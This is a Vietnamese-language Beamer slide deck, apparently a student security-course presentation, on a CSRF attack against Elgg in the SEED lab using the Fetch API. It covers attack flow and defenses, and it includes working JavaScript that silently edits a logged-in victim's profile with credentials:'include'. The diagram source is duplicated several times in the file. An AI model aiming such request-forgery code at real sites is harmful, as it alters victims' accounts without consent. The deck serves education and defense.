% =====================================================================
%  SLIDE (Beamer/metropolis) — CSRF trên Elgg bằng Fetch API (Tiếng Việt)
%  Biên dịch: xelatex slides_vi.tex  (chạy 2 lần)
% =====================================================================
\documentclass[11pt,aspectratio=169]{beamer}
\usetheme{metropolis}
\metroset{progressbar=frametitle,numbering=fraction,block=fill}

\usepackage{fontspec}
\setsansfont{TeX Gyre Heros}
\setmonofont{Noto Sans Mono}[Scale=0.82]
\usepackage[vietnamese]{babel}

% ---- Brand colours ----
\definecolor{navy}{HTML}{1E3C72}
\definecolor{brandblue}{HTML}{2A5298}
\definecolor{accent}{HTML}{2563EB}
\definecolor{danger}{HTML}{DC2626}
\definecolor{success}{HTML}{15803D}
\definecolor{amber}{HTML}{B45309}
\definecolor{slate}{HTML}{475569}
\definecolor{ink}{HTML}{0F172A}
\definecolor{mist}{HTML}{F1F5F9}
\setbeamercolor{frametitle}{bg=navy}
\setbeamercolor{progress bar}{fg=accent,bg=mist}
\setbeamercolor{title separator}{fg=accent}
\setbeamercolor{alerted text}{fg=danger}
\setbeamercolor{block title}{bg=brandblue,fg=white}
\setbeamercolor{block body}{bg=mist}
\setbeamercolor{block title alerted}{bg=danger,fg=white}
\setbeamercolor{block body alerted}{bg=danger!8,fg=black}
\setbeamercolor{block title example}{bg=success,fg=white}
\setbeamercolor{block body example}{bg=success!8,fg=black}

\usepackage{tikz}
\usetikzlibrary{arrows.meta,positioning,calc}
\usepackage{booktabs}
\usepackage{listings}
\definecolor{codebg}{HTML}{0F172A}\definecolor{codefg}{HTML}{E2E8F0}
\definecolor{codekey}{HTML}{38BDF8}\definecolor{codestr}{HTML}{86EFAC}
\definecolor{codecom}{HTML}{94A3B8}\definecolor{line}{HTML}{CBD5E1}
\lstset{basicstyle=\scriptsize\ttfamily\color{codefg},backgroundcolor=\color{codebg},
  keywordstyle=\color{codekey}\bfseries,stringstyle=\color{codestr},
  commentstyle=\color{codecom}\itshape,frame=single,framerule=0pt,
  rulecolor=\color{codebg},showstringspaces=false,breaklines=true,
  columns=fullflexible,keepspaces=true,xleftmargin=8pt,aboveskip=4pt,belowskip=2pt}
\lstdefinelanguage{JS}{keywords={const,let,new,async,await,fetch,return,function},
  morekeywords=[2]{URLSearchParams,FormData,append,addEventListener},
  keywordstyle=[2]\color{codestr}\bfseries,sensitive=true,
  morecomment=[l]{//},morestring=[b]',morestring=[b]"}
\usepackage{pifont}
\newcommand{\yes}{\textcolor{success}{\ding{52}}}
\newcommand{\no}{\textcolor{danger}{\ding{56}}}

% ---- diagram ----
% =====================================================================
%  diagram_flow.tex — CSRF attack sequence diagram (\csrfflowdiagram)
%  Labels default to Vietnamese; an English document may \renewcommand
%  them BEFORE % =====================================================================
%  diagram_flow.tex — CSRF attack sequence diagram (\csrfflowdiagram)
%  Labels default to Vietnamese; an English document may \renewcommand
%  them BEFORE % =====================================================================
%  diagram_flow.tex — CSRF attack sequence diagram (\csrfflowdiagram)
%  Labels default to Vietnamese; an English document may \renewcommand
%  them BEFORE \input{diagram_flow}.
% =====================================================================
\providecommand{\lblVictim}{Alice (nạn nhân) + Trình duyệt}
\providecommand{\lblAttacker}{Attacker\\\texttt{attacker32.com}}
\providecommand{\lblElgg}{Elgg\\\texttt{seed-server.com}}
\providecommand{\lblSa}{1. Đăng nhập hợp lệ}
\providecommand{\lblSb}{2. Set-Cookie \texttt{Elgg=...}}
\providecommand{\lblSc}{3. Vô tình mở trang độc hại}
\providecommand{\lblSd}{4. Trả \texttt{index.html} (Fetch script)}
\providecommand{\lblNe}{5. Script tự chạy (\texttt{DOMContentLoaded})}
\providecommand{\lblSf}{6. Fetch POST + cookie (\texttt{credentials:'include'})}
\providecommand{\lblNg}{7. Cookie hợp lệ $\Rightarrow$ cập nhật About me}
\providecommand{\lblSh}{8. Phản hồi 302 (opaque)}
\providecommand{\lblSi}{9. Xem lại hồ sơ $\to$ đã bị đổi}

\newcommand{\csrfflowdiagram}{%
\begin{tikzpicture}[
   >={Stealth[length=2.4mm]}, font=\sffamily\scriptsize,
   head/.style={draw=navy,fill=navy,text=white,rounded corners=3pt,
                align=center,minimum height=0.85cm,minimum width=3.2cm,
                font=\sffamily\scriptsize\bfseries},
   life/.style={line,dashed,line width=0.7pt},
   msg/.style={->,accent,line width=0.9pt},
   ret/.style={->,slate,line width=0.7pt,dashed},
   note/.style={draw=amber,fill=amber!12,rounded corners=2pt,align=center,
                inner sep=3pt,font=\sffamily\scriptsize,text=amber!60!black}]

  \def\ax{0} \def\bx{5.4} \def\cx{10.8}
  \def\ytop{0} \def\ybot{-9.3}

  % lifeline heads
  \node[head] (A) at (\ax,\ytop) {\lblVictim};
  \node[head] (B) at (\bx,\ytop) {\lblAttacker};
  \node[head] (C) at (\cx,\ytop) {\lblElgg};

  % lifelines
  \draw[life] (\ax,-0.55) -- (\ax,\ybot);
  \draw[life] (\bx,-0.55) -- (\bx,\ybot);
  \draw[life] (\cx,-0.55) -- (\cx,\ybot);

  % messages
  \draw[msg] (\ax,-1.2) -- node[above]{\lblSa} (\cx,-1.2);
  \draw[ret] (\cx,-2.0) -- node[above]{\lblSb} (\ax,-2.0);
  \draw[msg] (\ax,-2.9) -- node[above]{\lblSc} (\bx,-2.9);
  \draw[ret] (\bx,-3.7) -- node[above]{\lblSd} (\ax,-3.7);

  \node[note,anchor=north west] at (\ax-1.7,-4.35) {\lblNe};

  \draw[msg,danger] (\ax,-5.6) -- node[above,text=danger]{\lblSf} (\cx,-5.6);

  \node[note,anchor=north] at (\cx,-6.2) {\lblNg};

  \draw[ret] (\cx,-7.4) -- node[above]{\lblSh} (\ax,-7.4);
  \draw[msg,success] (\ax,-8.4) -- node[above,text=success]{\lblSi} (\cx,-8.4);
\end{tikzpicture}%
}
.
% =====================================================================
\providecommand{\lblVictim}{Alice (nạn nhân) + Trình duyệt}
\providecommand{\lblAttacker}{Attacker\\\texttt{attacker32.com}}
\providecommand{\lblElgg}{Elgg\\\texttt{seed-server.com}}
\providecommand{\lblSa}{1. Đăng nhập hợp lệ}
\providecommand{\lblSb}{2. Set-Cookie \texttt{Elgg=...}}
\providecommand{\lblSc}{3. Vô tình mở trang độc hại}
\providecommand{\lblSd}{4. Trả \texttt{index.html} (Fetch script)}
\providecommand{\lblNe}{5. Script tự chạy (\texttt{DOMContentLoaded})}
\providecommand{\lblSf}{6. Fetch POST + cookie (\texttt{credentials:'include'})}
\providecommand{\lblNg}{7. Cookie hợp lệ $\Rightarrow$ cập nhật About me}
\providecommand{\lblSh}{8. Phản hồi 302 (opaque)}
\providecommand{\lblSi}{9. Xem lại hồ sơ $\to$ đã bị đổi}

\newcommand{\csrfflowdiagram}{%
\begin{tikzpicture}[
   >={Stealth[length=2.4mm]}, font=\sffamily\scriptsize,
   head/.style={draw=navy,fill=navy,text=white,rounded corners=3pt,
                align=center,minimum height=0.85cm,minimum width=3.2cm,
                font=\sffamily\scriptsize\bfseries},
   life/.style={line,dashed,line width=0.7pt},
   msg/.style={->,accent,line width=0.9pt},
   ret/.style={->,slate,line width=0.7pt,dashed},
   note/.style={draw=amber,fill=amber!12,rounded corners=2pt,align=center,
                inner sep=3pt,font=\sffamily\scriptsize,text=amber!60!black}]

  \def\ax{0} \def\bx{5.4} \def\cx{10.8}
  \def\ytop{0} \def\ybot{-9.3}

  % lifeline heads
  \node[head] (A) at (\ax,\ytop) {\lblVictim};
  \node[head] (B) at (\bx,\ytop) {\lblAttacker};
  \node[head] (C) at (\cx,\ytop) {\lblElgg};

  % lifelines
  \draw[life] (\ax,-0.55) -- (\ax,\ybot);
  \draw[life] (\bx,-0.55) -- (\bx,\ybot);
  \draw[life] (\cx,-0.55) -- (\cx,\ybot);

  % messages
  \draw[msg] (\ax,-1.2) -- node[above]{\lblSa} (\cx,-1.2);
  \draw[ret] (\cx,-2.0) -- node[above]{\lblSb} (\ax,-2.0);
  \draw[msg] (\ax,-2.9) -- node[above]{\lblSc} (\bx,-2.9);
  \draw[ret] (\bx,-3.7) -- node[above]{\lblSd} (\ax,-3.7);

  \node[note,anchor=north west] at (\ax-1.7,-4.35) {\lblNe};

  \draw[msg,danger] (\ax,-5.6) -- node[above,text=danger]{\lblSf} (\cx,-5.6);

  \node[note,anchor=north] at (\cx,-6.2) {\lblNg};

  \draw[ret] (\cx,-7.4) -- node[above]{\lblSh} (\ax,-7.4);
  \draw[msg,success] (\ax,-8.4) -- node[above,text=success]{\lblSi} (\cx,-8.4);
\end{tikzpicture}%
}
.
% =====================================================================
\providecommand{\lblVictim}{Alice (nạn nhân) + Trình duyệt}
\providecommand{\lblAttacker}{Attacker\\\texttt{attacker32.com}}
\providecommand{\lblElgg}{Elgg\\\texttt{seed-server.com}}
\providecommand{\lblSa}{1. Đăng nhập hợp lệ}
\providecommand{\lblSb}{2. Set-Cookie \texttt{Elgg=...}}
\providecommand{\lblSc}{3. Vô tình mở trang độc hại}
\providecommand{\lblSd}{4. Trả \texttt{index.html} (Fetch script)}
\providecommand{\lblNe}{5. Script tự chạy (\texttt{DOMContentLoaded})}
\providecommand{\lblSf}{6. Fetch POST + cookie (\texttt{credentials:'include'})}
\providecommand{\lblNg}{7. Cookie hợp lệ $\Rightarrow$ cập nhật About me}
\providecommand{\lblSh}{8. Phản hồi 302 (opaque)}
\providecommand{\lblSi}{9. Xem lại hồ sơ $\to$ đã bị đổi}

\newcommand{\csrfflowdiagram}{%
\begin{tikzpicture}[
   >={Stealth[length=2.4mm]}, font=\sffamily\scriptsize,
   head/.style={draw=navy,fill=navy,text=white,rounded corners=3pt,
                align=center,minimum height=0.85cm,minimum width=3.2cm,
                font=\sffamily\scriptsize\bfseries},
   life/.style={line,dashed,line width=0.7pt},
   msg/.style={->,accent,line width=0.9pt},
   ret/.style={->,slate,line width=0.7pt,dashed},
   note/.style={draw=amber,fill=amber!12,rounded corners=2pt,align=center,
                inner sep=3pt,font=\sffamily\scriptsize,text=amber!60!black}]

  \def\ax{0} \def\bx{5.4} \def\cx{10.8}
  \def\ytop{0} \def\ybot{-9.3}

  % lifeline heads
  \node[head] (A) at (\ax,\ytop) {\lblVictim};
  \node[head] (B) at (\bx,\ytop) {\lblAttacker};
  \node[head] (C) at (\cx,\ytop) {\lblElgg};

  % lifelines
  \draw[life] (\ax,-0.55) -- (\ax,\ybot);
  \draw[life] (\bx,-0.55) -- (\bx,\ybot);
  \draw[life] (\cx,-0.55) -- (\cx,\ybot);

  % messages
  \draw[msg] (\ax,-1.2) -- node[above]{\lblSa} (\cx,-1.2);
  \draw[ret] (\cx,-2.0) -- node[above]{\lblSb} (\ax,-2.0);
  \draw[msg] (\ax,-2.9) -- node[above]{\lblSc} (\bx,-2.9);
  \draw[ret] (\bx,-3.7) -- node[above]{\lblSd} (\ax,-3.7);

  \node[note,anchor=north west] at (\ax-1.7,-4.35) {\lblNe};

  \draw[msg,danger] (\ax,-5.6) -- node[above,text=danger]{\lblSf} (\cx,-5.6);

  \node[note,anchor=north] at (\cx,-6.2) {\lblNg};

  \draw[ret] (\cx,-7.4) -- node[above]{\lblSh} (\ax,-7.4);
  \draw[msg,success] (\ax,-8.4) -- node[above,text=success]{\lblSi} (\cx,-8.4);
\end{tikzpicture}%
}


% ---- Title metadata ----
\title{Tấn công CSRF trên Elgg bằng Fetch API}
\subtitle{Thay thế XMLHttpRequest / Form submit bằng \texttt{fetch()} hiện đại}
\author{Nhóm 3 — \textit{TV1 · TV2 · TV3}}
\institute{An toàn và Bảo mật Hệ thống Thông tin}
\date{\today}

\begin{document}

{\setbeamercolor{background canvas}{bg=navy}
\setbeamercolor{normal text}{fg=white}
\setbeamercolor{title}{fg=white}\setbeamercolor{subtitle}{fg=mist}
\setbeamercolor{author}{fg=mist}\setbeamercolor{institute}{fg=mist}\setbeamercolor{date}{fg=mist}
\begin{frame}[plain]\titlepage\end{frame}}

% ---------------------------------------------------------------
\begin{frame}{Nội dung trình bày}
  \setbeamertemplate{section in toc}[sections numbered]
  \tableofcontents
\end{frame}

% ===============================================================
\section{Phân công \& Tổng quan}

\begin{frame}{Phân công công việc (Nhóm 3 — mô hình 2 tầng)}
  \textbf{Tầng 1 — Nền tảng chung (bắt buộc 100\% thành viên):} tự chạy Docker, tự bắt gói tin, tự đổi About me thành MSV của mình, cùng vấn đáp chéo 15 câu hỏi.
  \vfill
  \begin{columns}[t]
    \column{0.33\textwidth}
      \begin{block}{TV1 — Offensive}
        \scriptsize Docker, bắt gói tin, \texttt{index.html} + \texttt{exploit.py}. \\ Q\&A 4–8.
      \end{block}
    \column{0.33\textwidth}
      \begin{block}{TV2 — Browser/Defense}
        \scriptsize Phân tích trình duyệt/CORS/SameSite, quay \& dựng video. \\ Q\&A 1,3,10–14.
      \end{block}
    \column{0.33\textwidth}
      \begin{block}{TV3 — Research/Slides}
        \scriptsize Slide, sơ đồ, báo cáo, kiểm chứng phòng thủ. \\ Q\&A 2,9,15.
      \end{block}
  \end{columns}
\end{frame}

\begin{frame}{CSRF là gì?}
  \alert{Cross-Site Request Forgery} — kẻ tấn công lừa trình duyệt của nạn nhân (\emph{đang đăng nhập}) gửi một yêu cầu mạo danh tới máy chủ mục tiêu.
  \vfill
  \textbf{Ba điều kiện cần:}
  \begin{enumerate}
    \item Nạn nhân có phiên đăng nhập còn hiệu lực (session cookie).
    \item Hành động thay đổi trạng thái, tham số \alert{dự đoán được}.
    \item Ứng dụng \alert{thiếu phòng vệ} (không SameSite, không token).
  \end{enumerate}
  \vfill
  \footnotesize\textbf{Mục tiêu:} đổi trường \emph{About me} của Alice thành \texttt{CSRF attack by <MSV>}.
\end{frame}

% ===============================================================
\section{Kỹ thuật tấn công Fetch API}

\begin{frame}{Yêu cầu cải tiến: từ XHR/Form sang Fetch API}
  \begin{center}\footnotesize
  \begin{tabular}{lccc}
    \toprule
    \textbf{Tiêu chí} & \textbf{Form submit} & \textbf{XHR} & \textbf{Fetch API}\\
    \midrule
    Tàng hình (không chuyển trang) & \no & \yes & \yes\\
    Cú pháp hiện đại (async) & \no & \no & \yes\\
    Đề bài & \no{} cấm & \no{} cấm & \yes{} bắt buộc\\
    \bottomrule
  \end{tabular}
  \end{center}
  \medskip
  \begin{alertblock}{Hai cờ then chốt}
    \footnotesize
    \texttt{credentials: 'include'} → ép trình duyệt đính kèm cookie phiên cross-origin.\\
    \texttt{mode: 'no-cors'} + urlencoded/FormData → Simple Request, \alert{không} Preflight.
  \end{alertblock}
\end{frame}

\begin{frame}[fragile]{Phân tích gói tin \& mã khai thác}
  \scriptsize Endpoint: \texttt{POST http://www.seed-server.com/action/profile/edit}
  \begin{lstlisting}[language=JS]
const payload = new URLSearchParams();
payload.append('name', 'Alice');
payload.append('description', '<p>CSRF attack by B21DCCN001</p>');
payload.append('accesslevel[description]', '2');   // 2 = Public
payload.append('guid', '42');                       // Alice's GUID
fetch('http://www.seed-server.com/action/profile/edit', {
  method: 'POST',
  mode: 'no-cors',          // Simple Request -> no Preflight
  credentials: 'include',   // REQUIRED: attach session cookie
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: payload
});
  \end{lstlisting}
  \footnotesize Biến thể \texttt{FormData}: không đặt \texttt{Content-Type} thủ công (trình duyệt tự sinh boundary).
\end{frame}

% ===============================================================
\section{Luồng tấn công \& Kết quả}

\begin{frame}{Sơ đồ luồng tấn công}
  \begin{center}
  \scalebox{0.58}{\csrfflowdiagram}
  \end{center}
\end{frame}

\begin{frame}{Minh chứng thực nghiệm}
  \begin{columns}[t]
    \column{0.33\textwidth}\centering
      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Trước}\\[3pt]About me ban đầu}}
      \\[4pt]\scriptsize Hồ sơ gốc của Alice
    \column{0.33\textwidth}\centering
      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Trong}\\[3pt]Console F12: Fetch POST}}
      \\[4pt]\scriptsize Gửi ngầm, không chuyển trang
    \column{0.33\textwidth}\centering
      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Sau}\\[3pt]\texttt{CSRF attack by <MSV>}}}
      \\[4pt]\scriptsize About me đã bị đổi
  \end{columns}
  \vfill
  \begin{exampleblock}{Kết quả}
    \small Tấn công thành công hoàn toàn — không cảnh báo, không chuyển hướng (môi trường chưa bật phòng vệ).
  \end{exampleblock}
\end{frame}

% ===============================================================
\section{Phòng thủ \& Kết luận}

\begin{frame}{Phòng thủ nhiều lớp (Defense-in-Depth)}
  \footnotesize
  \begin{tabular}{ll}
    \toprule
    \textbf{Lớp} & \textbf{Biện pháp}\\
    \midrule
    Cookie & \texttt{SameSite=Lax/Strict} — không gửi cookie cross-site\\
    Ứng dụng & Anti-CSRF token — attacker không đọc được (SOP)\\
    Ứng dụng & Double Submit Cookie\\
    Header & Kiểm tra \texttt{Origin} / \texttt{Sec-Fetch-Site}\\
    Giao diện & \texttt{X-Frame-Options} / CSP \texttt{frame-ancestors}\\
    \bottomrule
  \end{tabular}
  \medskip
  \begin{block}{Bằng chứng phòng thủ}
    \footnotesize Bật lại anti-CSRF token của Elgg → cùng payload \alert{thất bại} (thiếu \texttt{\_\_elgg\_token}). About me \textbf{không đổi}.
  \end{block}
\end{frame}

\begin{frame}{Minh bạch sử dụng AI \& Kết luận}
  \textbf{Khai báo mức độ AI:}
  \begin{itemize}\small
    \item \textbf{Mức 1:} phản biện cơ chế CORS/Simple Request — sinh viên tự code.
    \item \textbf{Mức 2:} AI đồng sáng tạo định dạng, sơ đồ theo thiết kế của nhóm.
    \item \textbf{Mức 3:} AI sinh khung \texttt{exploit.py}/template; nhóm cấu hình \& kiểm thử.
  \end{itemize}
  \vfill
  \begin{alertblock}{Thông điệp cốt lõi}
    \small CSRF \textbf{không} bị HTTPS ngăn chặn. Giải pháp căn cơ: \texttt{SameSite} cookie + anti-CSRF token + kiểm tra nguồn gốc request. \textit{Học tấn công để phòng thủ.}
  \end{alertblock}
\end{frame}

{\setbeamercolor{background canvas}{bg=navy}
\begin{frame}[plain]
  \centering\vfill
  {\color{white}\Huge\textbf{Cảm ơn thầy và các bạn!}}\\[10pt]
  {\color{mist}\large Hỏi \& đáp (Q\&A)}
  \vfill
\end{frame}}

\end{document}
